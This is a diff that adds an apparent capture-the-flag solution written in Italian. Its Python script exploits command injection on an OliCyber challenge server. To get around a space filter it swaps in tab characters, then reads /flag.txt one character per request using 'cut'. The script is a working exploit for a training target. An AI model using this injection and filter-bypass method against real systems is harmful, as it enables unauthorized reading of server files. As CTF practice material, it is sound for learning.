@@ -1,0 +1,72 @@
+Si usa il comando cut (non bloccato) per isolare l'N-esimo byte del file.
+
+Si eseguono N richieste POST separate, incrementando l'indice del carattere ad ogni richiesta, fino alla ricostruzione completa della flag.
+
+import requests
+import string
+import time
+
+# --- CONFIGURAZIONE ---
+# ⚠️ SOSTITUISCI CON L'URL COMPLETO DELLA TUA CHALLENGE
+URL = "http://timp.challs.olicyber.it/handler.php"
+# ----------------------
+
+def extract_flag():
+    flag = ""
+    i = 1  # Iniziamo dal primo carattere
+
+    print("Inizio la ricostruzione della flag (Blind SQLi-like)...")
+    
+    # Il carattere di Tabulazione (ASCII 9) per il bypass dello spazio
+    tab_char = '\t' 
+
+    while True:
+        # Costruisce il payload: cut<TAB>-c[i]<TAB>/flag.txt
+        # Usiamo f-string e il carattere Tabulatore
+        payload_cmd = f"cut{tab_char}-c{i}{tab_char}/flag.txt"
+        
+        # Dati POST da inviare al server
+        data = {"cmd": payload_cmd}
+        
+        try:
+            # Invio della richiesta POST
+            response = requests.post(URL, data=data)
+            
+            # Il server stampa solo i primi 10 caratteri.
+            # Il carattere che cerchiamo è il primo dell'output
+            char = response.text.strip()
+            
+            # Se la risposta è vuota o contiene il messaggio di errore/altro
+            if not char:
+                # Se l'output è vuoto, siamo alla fine del file o c'è un errore.
+                print(f"\n[!] Carattere {i}: Output vuoto. Assumiamo fine della flag.")
+                break
+            
+            # Prendiamo il primo carattere estratto
+            extracted_char = char[0]
+            
+            # Controlla la condizione di terminazione
+            if extracted_char == '}':
+                flag += extracted_char
+                print(f"\n\n[🎉] Flag Trovata: {flag}")
+                break
+            
+            flag += extracted_char
+            
+            # Stampa il progresso su una singola riga
+            print(f"[{i:02}] Carattere estratto: {extracted_char} -> Flag attuale: {flag}", end='\r') 
+            
+            i += 1
+            
+            # Piccola pausa per non stressare il server
+            time.sleep(0.05) 
+            
+        except requests.exceptions.RequestException as e:
+            print(f"\n[-] Errore di connessione: {e}. Interruzione.")
+            break
+        except Exception as e:
+            print(f"\n[-] Errore inatteso: {e}. Interruzione.")
+            break
+
+if __name__ == "__main__":
+    extract_flag()
